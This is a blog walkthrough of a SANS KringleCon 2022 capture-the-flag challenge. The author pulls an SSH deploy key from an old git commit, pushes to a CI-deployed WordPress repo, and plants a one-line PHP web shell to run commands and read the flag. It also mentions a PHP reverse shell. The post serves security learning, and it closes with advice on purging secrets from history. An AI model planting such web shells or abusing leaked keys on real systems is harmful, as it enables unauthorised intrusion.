---
title: "SANS Kringlecon 2022 - Jolly CI/CD"
date: 2022-12-24
categories:
  - CTF
tags:
  - CICD
  - Git
---

Merry Christmas! Someone told me about SANS holiday hack challenge (KringleCon 2022!) https://www.sans.org/mlp/holiday-hack-challenge/ and I've been having a go at it. Really great content so far and I wanted to share this challenge writeup I personally enjoyed the most. This is the 7th out of 15 (i think!)  other challenges and its **Jolly CI/CD** 


![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_2.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_3.png)
This challenge says we have a 'PHP' store front. But i'm wondering where the URL was... But anyway the first thing I checked was if there were sudo privileges, we have `root` privileges on this machine.

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_1.png)

I also observed that there was a 'screen' profile file in the home directory. So naturally I tried to see if there were any active screen sessions, perhaps I can attach to the existing sessions. I also have root privileges, so tried on it too. 

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_6.png)

### Wheres the website?
After wasting some time not knowing what to do, I went back to the previous challenge and realised I didn't finish the chat with him, and thats where the URL was.

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_4.png)

That is a git repo, so lets clone it:

```bash
git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
```


### wordpress.flag.net.internal repo

Observe that this is a wordpress website, these files first caught my attention:

- .git - folder may have alot of juicy stuff
- index.php - may tell us more about what this application is about
- .gitlab-ci.yml - definitely worth checking out

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_12.png)


## `.gitlab-ci.yml` is a Gitlab CI file

https://docs.gitlab.com/ee/ci/yaml/index.html

I googled abit and found this is "YAML" file tells git to carry out instructions such as bash, shell commands to be carried out when it is deploying the application E.g. the 'rsync' command seems to be synchronizing the git repo anad deploying it to /var/www/html. I'm not 100% sure but it does seem like this to me. If we can possibly put files or code here, we may possibly exploit this.

Contents of **.gitlab-ci.yml**
```
grinchum-land:/home/samways/wordpress.flag.net.internal# cat .gitlab-ci.yml
stages:
  - deploy

deploy-job:      
  stage: deploy 
  environment: production
  script:
    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html
```


I also observed a location of interest `wordpress.flag.net.internal` and I checked if it was reachable, it is!
![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_7.png)

## Nmap

I have nmap too?
![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_8.png)

Started scanning away and found 2 open services. Didn't tried to go deeper and discover all ports as I felt it was unecessary, and also there were no .nse scripts to help give us more detailed scan results.

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_9.png)

### SSH
We can SSH and perhaps we can connect to it using some credentials discovered later?
![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_11.png)

### HTTP 
I was able to reach the URL that was observed in the `.gitlab-ci.yml` file - this gave me some idea that the git is Actually being deployed. And if we can control the contents of this repo and some how push it, it may be profit.

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_10.png)

### Check git 
Ran  command to check for previous commit history

```bash
git log
```

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_13.png)

Something interesting here is that the commit comment was "whoops", did the owner commited something by mistake? We can try pull the previous commit `abdea0ebb.....` to see what it was..

```bash
git reset --hard abdea0ebb21b156c01f7533cea3b895c26198c98
```

## Found SSH key

Noice!

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_14.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_15.png)

Copy the SSH private key

```bash
# copy privat key
cat ~/wordpress.flag.net.internal/.ssh/.deploy > ~/.ssh/id_rsa
chmod 600 ~/.ssh/id_rsa
```


If this SSH key is what i think it is e.g. to let us push changes to this repo (remember the rsync part in .yml file?) I may have some idea how to exploit:

- Modify files to the repo and push changes to the git repo 
- If the `gitlab-ci.yml` deploy the web app, the "rsync" part will be able to add in some goodies together with the deployment. 
- We may even possibly get a reverse shell? Since we can access e.g. `curl index.php` and we know that it is loading a php file, what if we put a pentestmonkey php reverse shell there, and then curl 'index.php' to call it?
- Perhaps a php file that allows exec shell command will suffice too

---

# Exploitation

I spent alot of time trying to figure out how to push changes to the repo using the new found **SSH private key** and TLDR this is the main reason alot of time was wasted

1. Use a custom SSH key for git command
https://docs.gitlab.com/ee/topics/git/useful_git_commands.html
![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_16.png)
2. Clone repo using SSH (instead of HTTP) - **when you clone with HTTP you won't be able to commit changes using SSH key!**

## Couldn't push changes?

I reverted the changes to latest branch using this command. Thats because I previously reset the repo to the part where ssh keys were revealed, but now I want the latest version of repo that has the `.gitlab-ci.yml` to deploy the web app everytime we make changes to the repo.

```bash
# revert to main
git pull origin main

# test write a file into the main directory
echo "HELLO" > test.txt

git add test.txt

#was prompted by git config - we have this info earlier by observing the SSH public key
git config --global user.email "sporx@kringlecon.com"
git config --global user.name "sporx"
git commit -m Test

git push 
# Hmm didnt work

GIT_SSH_COMMAND="ssh -i ~/.ssh/id_rsa" git push 
# didnt work too?!
```

This didnt work, and i was prompted a 'Username' which I should not (because I had supplied the git clone command using SSH private key )

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_18.png)

## Reclone repo with SSH keys - didnt work

I reclone again the "GIT_SSH_COMMAND" repo with ssh keys and feeling it might work this time

```bash
# remove the previous clone
cd ~
rm -rf wordpress.flag.net.internal

GIT_SSH_COMMAND="ssh -i ~/.ssh/id_rsa" git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git 

# Did all of previous commands with "GIT_SSH_COMMAND" in the front to add/commit/push but didn't work
GIT_SSH_COMMAND="ssh -i ~/.ssh/ida_rsa" git <command>
```

Didn't work, at this point, I'm confused how to proceed! I was still prompted for a 'username' again which shouldn't be the case since I had provided a SSH private key.

## Reclone repo with SSH keys - corrected

After much googling, I realised mistake was that (1) I did not check if my keys were correct - they might be wrongly formatted (2) Syntax used to clone the git was not 
using the SSH protocol! 

### Testing SSH keys

The following was used to check SSH keys if it can connect to the git repo. And `ssh-add` could be used to 'register' our private key to be used.

https://docs.gitlab.com/ee/user/ssh.html

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_17.png)

```bash
# start ssh-agent
eval "$(ssh-agent -s)"

# add private key
ssh-add ~/.ssh/id_rsa

# Test SSH connection
ssh -T git@gitlab.flag.net.internal
# Welcome to GitLab, @knee-oh!
```

### git clone with SSH
Now, we can clone
The correct way to clone git with SSH key is to use the syntax `git clone ssh://git@server_name_here/repo.git` **NOT** `http://....`

```bash
# remove the previous clone
cd ~
rm -rf wordpress.flag.net.internal

GIT_SSH_COMMAND="ssh -i ~/.ssh/id_rsa" git clone ssh://git@gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
```

At this point I can add/commit/push the changes to the repo. To be sure, we tested if the file could be found by using a `curl` to see it

```bash
curl http://wordpress.flag.net.internal/test.txt
```

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_19.png)

# RCE

I am pretty sure at this point we can do a reverse shell and the easiest RCE to do so at this point would be the nifty PHP rce script which we can use very well with `curl`

We can add this file and push it to the repo
```bash
echo '<?php echo shell_exec($_GET["cmd"]);?>' > rce.php

# add/commit/push here

# supply command to our RCE php script
curl http://wordpress.flag.net.internal/rce.php?cmd=whoami
```

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_20.png)

At this point, we have RCE and can execute commands (even get a shell if we want to). After exploring around what files are there, found a flag.

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_21.png)

```
# get flag!
curl http://wordpress.flag.net.internal/rce.php?cmd=cat%20../../../flag.txt
```

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_22.png)

I was surprised that I could view this file since we are at `/` directory and typically all files/folders are `root` privileges here. I thought that we needed to privilege escalate from `www-data` user to `root`. But after checking, it appears the flag was set to `www-data` user which allows us (as a `www-data` user) to read it. If not, we may not be able to read the flag.

![]({{ site.url }}{{ site.baseurl }}/assets/images/sans-kringlecon-2022/7_challenge_23.png)

# Conclusion

One of the best challenges I had, this was a great example of how GIT commits can allow sensitive information to be leaked out by mistakenly commiting passwords, keys etc. An attacker who gets hold of the repo may be able to pull sensitive files (like we did to see ssh keys).

The way to prevent this is to **purge** the sensitive files from repository's history. In this case, the `.ssh` folder which contain private keys - This could be removed entirely from the history. https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository

